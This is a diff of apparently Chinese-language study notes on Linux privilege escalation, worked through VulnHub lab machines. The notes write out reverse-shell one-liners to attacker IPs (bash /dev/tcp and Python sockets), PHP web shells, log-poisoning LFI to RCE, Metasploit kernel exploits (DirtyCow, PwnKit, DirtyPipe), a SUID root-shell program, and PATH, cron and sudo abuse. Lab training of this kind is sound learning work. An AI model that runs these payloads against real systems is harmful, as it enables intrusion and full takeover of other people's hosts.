-<p><font style="color:#000000;">wpscan –url <a target="_blank" rel="noopener" href="http://192.168.139.153/h3l105/">http://192.168.139.153/h3l105/</a> –plugins-detection aggressive</font></p>
-<p><font style="color:#000000;">searchsploit mail masta 1.0   &#x2F;&#x2F;kali自带漏洞库</font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd">http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</a></font></p>
-<p><font style="color:#000000;">telnet 192.168.139.153 25</font></p>
-<p><font style="color:#000000;"></font></p>
-<p><font style="color:#000000;">MAIL FROM: MALABIS</font></p>
-<p><font style="color:#000000;">RCPT TO: helios</font></p>
-<p><font style="color:#000000;">data</font></p>
-<p><font style="color:#000000;"><?php system($_GET['shell']); ?></font></p>
-<p><font style="color:#000000;">.</font></p>
-<p><font style="color:#000000;">QUIT</font></p>
-<p><font style="color:#000000;"></font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&shell=/bin/bash%20-i%20%3E&%20/dev/tcp/192.168.139.141/6666%200%3E&1">http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;shell=/bin/bash%20-i%20%3E&amp;%20/dev/tcp/192.168.139.141/6666%200%3E&amp;1</a></font></p>
-<p><font style="color:#000000;">python -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.139.128”,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”]);’</font></p>
-<p><font style="color:#000000;">4、权限提升：</font></p>
-<p><font style="color:#000000;">&#x2F;opt&#x2F;statuscheck里有执行curl</font></p>
-<p><font style="color:#000000;">自己的文件自己能修改，所以curl能chmod 777</font></p>
-<p><font style="color:#000000;">python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</font></p>
-<p><font style="color:#000000;">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</font></p>
-<p><font style="color:#000000;">strings &#x2F;opt&#x2F;statuscheck</font></p>
-<p><font style="color:#000000;">cd &#x2F;tmp</font></p>
-<p><font style="color:#000000;">echo “&#x2F;bin&#x2F;sh” &gt; curl</font></p>
-<p><font style="color:#000000;">chmod 777 curl      </font></p>
-<p><font style="color:#000000;">export PATH&#x3D;&#x2F;tmp:$PATH</font></p>
-<p><font style="color:#000000;">echo $PATH</font></p>
-<p><font style="color:#000000;">&#x2F;opt&#x2F;statuscheck</font></p>
-<h3 id="SUID-SUDO应用场景："><a href="#SUID-SUDO应用场景：" class="headerlink" title="SUID&amp;SUDO应用场景："></a><font style="color:#000000;">SUID&amp;SUDO应用场景：</font></h3><p><font style="color:#000000;">获取到Web权限或普通用户在Linux服务器上时进行的SUID&amp;SUDO提权</font></p>
-<p><font style="color:#000000;">SUID (Set owner User ID up on execution)是给予文件的一个特殊类型的文件权限。在Linux&#x2F;Unix中，当一个程序运行的时候，程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序&#x2F;文件）所有者的权限来运行一个程序&#x2F;文件。用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的UID和GID。</font></p>
-<p><font style="color:#000000;">SUDO权限是root把本来只能超级用户执行的命令赋予普通用户执行，系统管理员集中的管理用户使用权限和使用主机，配置文件：&#x2F;etc&#x2F;sudoers，除此配置之外的问题，SUDO还有两个CVE漏洞（CVE-2019-14287 CVE-2021-3156）。</font></p>
-<p><font style="color:#000000;">#利用参考：</font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></font></p>
-<p><font style="color:#000000;">这个网站里面可以找一下参考</font></p>
+    <h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>当前主机的操作系统</p>
+<p>hostnamectl</p>
+<p>cat &#x2F;etc&#x2F;*-release</p>
+<p>lsb_release -a </p>
+<p>cat &#x2F;etc&#x2F;lsb-release # Debain</p>
+<p>cat &#x2F;etc&#x2F;redhat-release # Redhat</p>
+<p>cat &#x2F;etc&#x2F;centos-release # Centos</p>
+<p>cat &#x2F;etc&#x2F;os-release # Ubuntu</p>
+<p>cat &#x2F;etc&#x2F;issue</p>
+<p>当前主机的内核版本</p>
+<p>hostnamectl</p>
+<p>uname -a </p>
+<p>cat &#x2F;proc&#x2F;version</p>
+<p>dmesg | grep “Linux version”</p>
+<h2 id="内核漏洞筛选："><a href="#内核漏洞筛选：" class="headerlink" title="内核漏洞筛选："></a>内核漏洞筛选：</h2><p>下面的msf测试均在kali中进行</p>
+<p>MSF检测：</p>
+<p>run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</p>
+<p>提权脚本:</p>
+<p>筛选可能存在提权漏洞的信息，主要是内核漏洞提权</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/belane/linux-soft-exploit-suggester">https://github.com/belane/linux-soft-exploit-suggester</a></p>
+<p>综合脚本:</p>
+<p>包含一些其他CVE，但内核漏洞提权效果不如上面</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/redcode-labs/Bashark">https://github.com/redcode-labs/Bashark</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
+<h2 id="web-linux应用场景："><a href="#web-linux应用场景：" class="headerlink" title="web-linux应用场景："></a>web-linux应用场景：</h2><p>获取到Web权限在Linux服务器上时进行的内核漏洞提权</p>
+<h3 id="常见内核漏洞案例："><a href="#常见内核漏洞案例：" class="headerlink" title="常见内核漏洞案例："></a>常见内核漏洞案例：</h3><p>dirtycow（CVE-2016-5159）</p>
+<p>Pwnkit (CVE-2021-4034) </p>
+<p>Dirty Pipe（CVE-2022-0847)</p>
+<p>SUDO （CVE-2021-3156）</p>
+<p>大脏牛 (CVE-2017–1000405)</p>
+<p>CVE-2017-16995</p>
+<p>CVE-2021-3560</p>
+<p>CVE-2023-1829 </p>
+<p>CVE-2022-2588 </p>
+<p>CVE-2021-3493</p>
+<p>CVE-2022-32250</p>
+<p>CVE-2023-3269</p>
+<p>CVE-2022-0995</p>
+<p>CVE-2022-2639</p>
+<p>CVE-2023-0386</p>
+<p>…</p>
+<h4 id="Web-内核溢出-Dcow"><a href="#Web-内核溢出-Dcow" class="headerlink" title="Web&amp;内核溢出-Dcow"></a>Web&amp;内核溢出-Dcow</h4><p>复现环境：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></p>
+<p>1、信息收集：</p>
+<p>&#x2F;&#x2F;全端口扫描</p>
+<p>nmap -p1-65535 192.168.139.0&#x2F;24</p>
+<p>2、Web漏洞利用：&#x2F;&#x2F;msf</p>
+<p>search drupal</p>
+<p>use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2</p>
+<p>set rhost 192.168.46.144</p>
+<p>set rport 1898</p>
+<p>run</p>
+<p>3、内核提权：</p>
+<p>upload &#x2F;root&#x2F;linux-exploit-suggester.sh &#x2F;tmp&#x2F;1.sh</p>
+<p>shell</p>
+<p>cd &#x2F;tmp</p>
+<p>chmod +x 1.sh</p>
+<p>.&#x2F;1.sh</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p>
+<p>upload &#x2F;root&#x2F;dcow.cpp &#x2F;tmp&#x2F;dcow.cpp</p>
+<p>g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow dcow.cpp -lutil      &#x2F;有可能编译不了，如果目标机器上不能变异就在攻击机编译完，直接从攻击机上传编译完的 </p>
+<p>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
+<p>.&#x2F;dcow</p>
+<p>su root</p>
+<p>该漏洞只能利用一次，做完需要还原</p>
+<h4 id="Web-内核溢出-Pwnkit"><a href="#Web-内核溢出-Pwnkit" class="headerlink" title="Web&amp;内核溢出-Pwnkit"></a>Web&amp;内核溢出-Pwnkit</h4><p>复现环境：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/darkhole-1,724/">https://www.vulnhub.com/entry/darkhole-1,724/</a></p>
+<p>入口点是该网站修改用户名抓取id可以修改，后登录发现上传文件可以通过.phtml绕过，拿到webshell</p>
+<p>1、信息收集：</p>
+<p>nmap -p1-65535 192.168.139.0&#x2F;24</p>
+<p>2、Web漏洞利用：</p>
+<p>重置管理密码-上传1.phtml-反弹MSF，哥斯拉里面PMeterpreter模块可以反弹到msf上</p>
+<p>use exploit&#x2F;multi&#x2F;handler </p>
+<p>set payload php&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<p>set lhost 0.0.0.0</p>
+<p>set lport 6666</p>
+<p>run</p>
+<p>3、内核提权</p>
+<p>upload &#x2F;root&#x2F;linux-exploit-suggester.sh &#x2F;tmp&#x2F;1.sh</p>
+<p>shell</p>
+<p>cd &#x2F;tmp</p>
+<p>chmod +x 1.sh</p>
+<p>.&#x2F;1.sh</p>
+<p>search cve_2021_4034</p>
+<p>use exploit&#x2F;linux&#x2F;local&#x2F;cve_2021_4034_pwnkit_lpe_pkexec</p>
+<p>set session x</p>
+<p>run</p>
+<p>getuid</p>
+<p>shell</p>
+<p>cd &#x2F;root</p>
+<p>cat root.txt</p>
+<h4 id="Web-内核溢出-DirtyPipe"><a href="#Web-内核溢出-DirtyPipe" class="headerlink" title="Web&amp;内核溢出-DirtyPipe"></a>Web&amp;内核溢出-DirtyPipe</h4><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/">https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/</a></p>
+<p>1、信息收集：</p>
+<p>nmap -p1-65535 192.168.139.0&#x2F;24</p>
+<p>2、Web漏洞利用</p>
+<p>扫描发现-抓包分析-文件写入-反弹MSF</p>
+<p>gobuster dir -u <a target="_blank" rel="noopener" href="http://192.168.139.146/">http://192.168.139.146</a> -x php,bak,txt,html -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt</p>
+<p>扫到一个php文件为漏洞入口，可以上传一句话木马拿到webshell，下面为抓包的流量，可以看到post传入的时候也会明文显示文件名</p>
+<p>message&#x3D;<?php eval($_POST["pass"]);?>&amp;file&#x3D;xd.php</p>
+<p>哥斯拉webshell连上去接着用PMeterpreter模块打msf</p>
+<p>use exploit&#x2F;multi&#x2F;handler </p>
+<p>set payload php&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<p>set lhost 0.0.0.0</p>
+<p>set lport 6666</p>
+<p>run</p>
+<p>3、内核提权</p>
+<p>upload &#x2F;root&#x2F;linux-exploit-suggester.sh &#x2F;tmp&#x2F;1.sh</p>
+<p>shell</p>
+<p>cd &#x2F;tmp</p>
+<p>chmod +x 1.sh</p>
+<p>.&#x2F;1.sh   &#x2F;&#x2F;执行完发现有cve_2022_0847可以利用</p>
+<p>search cve_2022_0847</p>
+<p>use exploit&#x2F;linux&#x2F;local&#x2F;cve_2022_0847_dirtypipe</p>
+<p>set session x</p>
+<p>set lhost xx.xx.xx.xx</p>
+<p>run</p>
+<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>CVE-2023-0386</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Z6sVuMrYMZV8WD6z1-U95Q">https://mp.weixin.qq.com/s/Z6sVuMrYMZV8WD6z1-U95Q</a></p>
+<h3 id="Web-用户-NFS安全"><a href="#Web-用户-NFS安全" class="headerlink" title="Web&amp;用户-NFS安全"></a>Web&amp;用户-NFS安全</h3><p>NFS是一种基于TCP&#x2F;IP 传输的网络文件系统协议，通过使用NFS协议，客户机可以像访问本地目录一样访问远程服务器中的共享资源。</p>
+<p><a target="_blank" rel="noopener" href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacksudo-2-hackdudo,667/">https://www.vulnhub.com/entry/hacksudo-2-hackdudo,667/</a></p>
+<p>提升条件：NFS服务开启和web或用户权限进行利用</p>
+<p>1、信息收集：</p>
+<p>nmap 192.168.1.6</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.6/file.php?file=/etc/passwd">http://192.168.1.6/file.php?file=/etc/passwd</a></p>
+<p>2、NFS服务利用</p>
+<p>showmount -e 192.168.1.6    链接</p>
+<p>mkdir nfs</p>
+<p>mount -t nfs 192.168.1.6:&#x2F;mnt&#x2F;nfs .&#x2F;nfs  把攻击机的nfs和目标机器的&#x2F;mnt&#x2F;nfs同步，注意如果上传马要给权限</p>
+<p>chmod 777 shell.php</p>
+<p>3、配合SUID提权</p>
+<p>注意gcc编译机器与目标机内核版本相似</p>
+<p>直接cp复制机器上的suid文件也可以，改名再上传</p>
+<p>#include&lt;stdlib.h&gt;</p>
+<p>#include&lt;unistd.h&gt;</p>
+<p>int main()</p>
+<p>{</p>
+<p>setuid(0);</p>
+<p>system(“id”);</p>
+<p>system(“&#x2F;bin&#x2F;bash”);</p>
+<p>}</p>
+<p>gcc getroot.c -o getroot</p>
+<p>cp getroot &#x2F;root&#x2F;nfs #复制bash到挂载目录下</p>
+<p>chmod +s getroot #赋予suid权限</p>
+<p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null 再看看是否加入</p>
+<p>cd &#x2F;mnt&#x2F;nfs # 目标机</p>
+<p>.&#x2F;getroot # 目标机</p>
+<h3 id="Web-用户-Cron任务"><a href="#Web-用户-Cron任务" class="headerlink" title="Web&amp;用户-Cron任务"></a>Web&amp;用户-Cron任务</h3><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/jarbas-1,232/">https://www.vulnhub.com/entry/jarbas-1,232/</a></p>
+<p>提升条件：Web或用户权限进行查看，任务文件可修改</p>
+<p>1、信息收集：</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.139.152/access.html">http://192.168.139.152/access.html</a></p>
+<p>2、权限获取：</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.139.152:8080/">http://192.168.139.152:8080/</a></p>
+<p>Jenkins创建任务，添加反弹，立即构建</p>
+<p>这边添加的反弹可能是web用户或者普通用户权限 </p>
+<p>3、权限提升：</p>
+<p>cat &#x2F;etc&#x2F;crontab</p>
+<p>cat &#x2F;etc&#x2F;script&#x2F;CleaningScript.sh #查看脚本内容</p>
+<p>ls -lia &#x2F;etc&#x2F;script&#x2F;CleaningScript.sh #查看对任务文件的权限</p>
+<p>echo “&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.139.141&#x2F;66 0&gt;&amp;1” &gt;&gt; &#x2F;etc&#x2F;script&#x2F;CleaningScript.sh</p>
+<h3 id="Linux系统提权-Web-用户-PATH变量"><a href="#Linux系统提权-Web-用户-PATH变量" class="headerlink" title="Linux系统提权-Web&amp;用户-PATH变量"></a>Linux系统提权-Web&amp;用户-PATH变量</h3><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/symfonos-1,322/">https://www.vulnhub.com/entry/symfonos-1,322/</a></p>
+<p>提升条件：存在SUID的应用中能可逆向出执行命令，加用户权限</p>
+<p>目标开放445端口，判断有smb服务 </p>
+<p>1、信息收集：</p>
+<p>smbclient -L 192.168.139.153</p>
+<p>2、权限获取：</p>
+<p>smbclient &#x2F;&#x2F;192.168.139.153&#x2F;anonymous</p>
+<p>get attention.txt</p>
+<p>smbclient &#x2F;&#x2F;192.168.139.153&#x2F;helios -U helios</p>
+<p>helios \ qwerty</p>
+<p>3、漏洞利用&#x2F;&#x2F;从上面可以得到一个wordpress网站 wpscan kali自带</p>
+<p>wpscan –url <a target="_blank" rel="noopener" href="http://192.168.139.153/h3l105/">http://192.168.139.153/h3l105/</a> –plugins-detection aggressive</p>
+<p>searchsploit mail masta 1.0   &#x2F;&#x2F;kali自带漏洞库</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd">http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</a></p>
+<p>telnet 192.168.139.153 25</p>
+<p>MAIL FROM: MALABIS</p>
+<p>RCPT TO: helios</p>
+<p>data</p>
+<?php system($_GET['shell']); ?>
+
+<p>.</p>
+<p>QUIT</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&shell=/bin/bash%20-i%20%3E&%20/dev/tcp/192.168.139.141/6666%200%3E&1">http://192.168.139.153/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;shell=/bin/bash%20-i%20%3E&amp;%20/dev/tcp/192.168.139.141/6666%200%3E&amp;1</a></p>
+<p>python -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.139.128”,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”]);’</p>
+<p>4、权限提升：</p>
+<p>&#x2F;opt&#x2F;statuscheck里有执行curl</p>
+<p>自己的文件自己能修改，所以curl能chmod 777</p>
+<p>python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
+<p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
+<p>strings &#x2F;opt&#x2F;statuscheck</p>
+<p>cd &#x2F;tmp</p>
+<p>echo “&#x2F;bin&#x2F;sh” &gt; curl</p>
+<p>chmod 777 curl      </p>
+<p>export PATH&#x3D;&#x2F;tmp:$PATH</p>
+<p>echo $PATH</p>
+<p>&#x2F;opt&#x2F;statuscheck</p>
+<h3 id="SUID-SUDO应用场景："><a href="#SUID-SUDO应用场景：" class="headerlink" title="SUID&amp;SUDO应用场景："></a>SUID&amp;SUDO应用场景：</h3><p>获取到Web权限或普通用户在Linux服务器上时进行的SUID&amp;SUDO提权</p>
+<p>SUID (Set owner User ID up on execution)是给予文件的一个特殊类型的文件权限。在Linux&#x2F;Unix中，当一个程序运行的时候，程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序&#x2F;文件）所有者的权限来运行一个程序&#x2F;文件。用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的UID和GID。</p>
+<p>SUDO权限是root把本来只能超级用户执行的命令赋予普通用户执行，系统管理员集中的管理用户使用权限和使用主机，配置文件：&#x2F;etc&#x2F;sudoers，除此配置之外的问题，SUDO还有两个CVE漏洞（CVE-2019-14287 CVE-2021-3156）。</p>
+<p>#利用参考：</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<p>这个网站里面可以找一下参考</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2024/png/25663185/1724807930632-6551ba3c-b3e4-4460-b9c3-0e43d4ea9ca2.png"></p>
-<h4 id="Web-用户-Suid"><a href="#Web-用户-Suid" class="headerlink" title="Web&amp;用户-Suid"></a><font style="color:#000000;">Web&amp;用户-Suid</font></h4><p><font style="color:#000000;">1、SUID&amp;GUID</font></p>
-<p><font style="color:#000000;">环境：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></font></p>
-<p><font style="color:#000000;">命令：SUID GUID</font></p>
-<p><font style="color:#000000;">查找suid文件</font></p>
-<p><font style="color:#000000;">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</font></p>
-<p><font style="color:#000000;">find &#x2F; -perm -g&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</font></p>
-<p><font style="color:#000000;">项目：LinEnum PEASS-ng</font></p>
-<p><font style="color:#000000;">eg：find . &#x2F; -exec “whoami”;</font></p>
-<p><font style="color:#000000;">&#x2F;usr&#x2F;bin&#x2F;find . -exec ‘&#x2F;bin&#x2F;sh’ ;</font></p>
-<p><font style="color:#000000;">find &#x2F; -name 123 -exec ‘&#x2F;bin&#x2F;sh’ ;</font></p>
-<p><font style="color:#000000;">&#x2F;usr&#x2F;bin&#x2F;sudo find &#x2F;flag -exec cat &#x2F;f* ;</font></p>
-<p><font style="color:#000000;">2、SUID&amp;SUDO</font></p>
-<p><font style="color:#000000;">环境：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/toppo-1,245/">https://www.vulnhub.com/entry/toppo-1,245/</a></font></p>
-<p><font style="color:#000000;">搭建：创建任意虚拟机，然后将toppo.vmdx文件改名并替换原来的vmdx文件</font></p>
-<p><font style="color:#000000;">SUID：</font></p>
-<p><font style="color:#000000;">&#x2F;usr&#x2F;bin&#x2F;python2.7 -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.139.141”,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”]);’</font></p>
-<h4 id="Web-用户-Sudo-cve-用户是因为git这种项目部署的时候需要普通用户权限支持"><a href="#Web-用户-Sudo-cve-用户是因为git这种项目部署的时候需要普通用户权限支持" class="headerlink" title="Web&amp;用户-Sudo(cve)&#x2F;&#x2F;用户是因为git这种项目部署的时候需要普通用户权限支持"></a><font style="color:#000000;">Web&amp;用户-Sudo(cve)&#x2F;&#x2F;用户是因为git这种项目部署的时候需要普通用户权限支持</font></h4><p><font style="color:#000000;">1、SUDO</font></p>
-<p><font style="color:#000000;">环境：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/toppo-1,245/">https://www.vulnhub.com/entry/toppo-1,245/</a></font></p>
-<p><font style="color:#000000;">搭建：创建任意虚拟机，然后将toppo.vmdx文件改名并替换原来的vmdx文件</font></p>
-<p><font style="color:#000000;">SUDO:</font></p>
-<p><font style="color:#000000;">cat &#x2F;etc&#x2F;sudoers</font></p>
-<p><font style="color:#000000;">&#x2F;usr&#x2F;bin&#x2F;awk ‘BEGIN {system(“&#x2F;bin&#x2F;sh”)}’    &#x2F;&#x2F;利用sudoers里面的awk去新开一个root权限的sh</font></p>
-<p><font style="color:#000000;">2、SUDO-CVE</font></p>
-<p><font style="color:#000000;">环境：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/devguru-1,620/">https://www.vulnhub.com/entry/devguru-1,620/</a></font></p>
-<p><font style="color:#000000;">-信息收集：</font></p>
-<p><font style="color:#000000;">80，8585</font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="http://192.168.139.150/.git/">http://192.168.139.150/.git/</a></font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="http://192.168.139.150/adminer.php">http://192.168.139.150/adminer.php</a></font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="http://192.168.139.150/backend/backend/auth">http://192.168.139.150/backend/backend/auth</a></font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="http://192.168.139.150:8585/">http://192.168.139.150:8585/</a></font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="http://192.168.139.150:8585/admin">http://192.168.139.150:8585/admin</a></font></p>
-<p><font style="color:#000000;">-git泄漏(利用点)</font></p>
-<p><font style="color:#000000;">python GitHack.py <a target="_blank" rel="noopener" href="http://192.168.139.150/.git/">http://192.168.139.150/.git/</a></font></p>
-<p><font style="color:#000000;">-访问管理（Web入口）：</font></p>
-<p><font style="color:#000000;">adminer.php 添加用户名密码 登录后台 模版 写入Shell</font></p>
-<p><font style="color:#000000;">function onStart(){</font></p>
-<p><font style="color:#000000;">&#x2F;&#x2F;蚁剑连接</font></p>
-<p><font style="color:#000000;">eval($_POST[“pass”]);</font></p>
-<p><font style="color:#000000;">}</font></p>
-<p><font style="color:#000000;">-找备份寻突破（升权）：</font></p>
-<p><font style="color:#000000;">&#x2F;var&#x2F;backup&#x2F;app.ini.bak 修改用户密码 登录后台 写入反弹</font></p>
-<p><font style="color:#000000;">bash -c “exec bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.139.141&#x2F;5555 0&gt;&amp;1” </font></p>
-<p><font style="color:#000000;">-利用sudo提权（cve）：</font></p>
-<p><font style="color:#000000;">sudo -l</font></p>
-<p><font style="color:#000000;">sudo -u#-1 sqlite3 &#x2F;dev&#x2F;null ‘.shell &#x2F;bin&#x2F;sh’</font></p>
-<p><font style="color:#000000;">git源码泄露 &#x3D;&gt; 找到数据库密码，登入 &#x3D;&gt; 找到cms后台用户密码，改为已知密码 &#x3D;&gt; 登入cms后台，写shell（低权限）</font></p>
-<p><font style="color:#000000;">gitea数据库配置备份文件泄露 &#x3D;&gt; 连接gitea数据库，找到gitea的用户密码 &#x3D;&gt; 登入gitea，写shell（更高权限） &#x3D;&gt; 提权。</font></p>
-<p><font style="color:#000000;">3、SUDO-CVE</font></p>
-<p><font style="color:#000000;">环境：kali2020</font></p>
-<p><font style="color:#000000;">sudo: 1.8.2 - 1.8.31p2</font></p>
-<p><font style="color:#000000;">sudo: 1.9.0 - 1.9.5p1</font></p>
-<p><font style="color:#000000;">-判断：sudoedit -s &#x2F; 报错存在</font></p>
-<p><font style="color:#000000;">-利用：</font></p>
-<p><font style="color:#000000;">git clone <a target="_blank" rel="noopener" href="https://github.com/blasty/CVE-2021-3156.git">https://github.com/blasty/CVE-2021-3156.git</a></font></p>
-<p><font style="color:#000000;">cd CVE-2021-3156</font></p>
-<p><font style="color:#000000;">make</font></p>
-<p><font style="color:#000000;">chmod a+x sudo-hax-me-a-sandwich</font></p>
-<p><font style="color:#000000;">.&#x2F;sudo-hax-me-a-sandwich 0</font></p>
-<p><font style="color:#000000;"></font></p>
-<h3 id="Web-用户-UDF提权-数据库类型"><a href="#Web-用户-UDF提权-数据库类型" class="headerlink" title="Web&amp;用户-UDF提权&#x2F;&#x2F;数据库类型"></a><font style="color:#000000;">Web&amp;用户-UDF提权&#x2F;&#x2F;数据库类型</font></h3><p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/raven-2,269/">https://www.vulnhub.com/entry/raven-2,269/</a></font></p>
-<p><font style="color:#000000;">1、信息收集：</font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="http://192.168.139.155/vendor/">http://192.168.139.155/vendor/</a></font></p>
-<p><font style="color:#000000;">2、Web权限获取：</font></p>
-<p><font style="color:#000000;">searchsploit phpmailer &#x2F;&#x2F;kali漏洞库查找，查找完之后后面会跟利用文件或者利用方法，40969就是利用脚本</font></p>
+<h4 id="Web-用户-Suid"><a href="#Web-用户-Suid" class="headerlink" title="Web&amp;用户-Suid"></a>Web&amp;用户-Suid</h4><p>1、SUID&amp;GUID</p>
+<p>环境：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
+<p>命令：SUID GUID</p>
+<p>查找suid文件</p>
+<p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
+<p>find &#x2F; -perm -g&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
+<p>项目：LinEnum PEASS-ng</p>
+<p>eg：find . &#x2F; -exec “whoami”;</p>
+<p>&#x2F;usr&#x2F;bin&#x2F;find . -exec ‘&#x2F;bin&#x2F;sh’ ;</p>
+<p>find &#x2F; -name 123 -exec ‘&#x2F;bin&#x2F;sh’ ;</p>
+<p>&#x2F;usr&#x2F;bin&#x2F;sudo find &#x2F;flag -exec cat &#x2F;f* ;</p>
+<p>2、SUID&amp;SUDO</p>
+<p>环境：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/toppo-1,245/">https://www.vulnhub.com/entry/toppo-1,245/</a></p>
+<p>搭建：创建任意虚拟机，然后将toppo.vmdx文件改名并替换原来的vmdx文件</p>
+<p>SUID：</p>
+<p>&#x2F;usr&#x2F;bin&#x2F;python2.7 -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.139.141”,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”]);’</p>
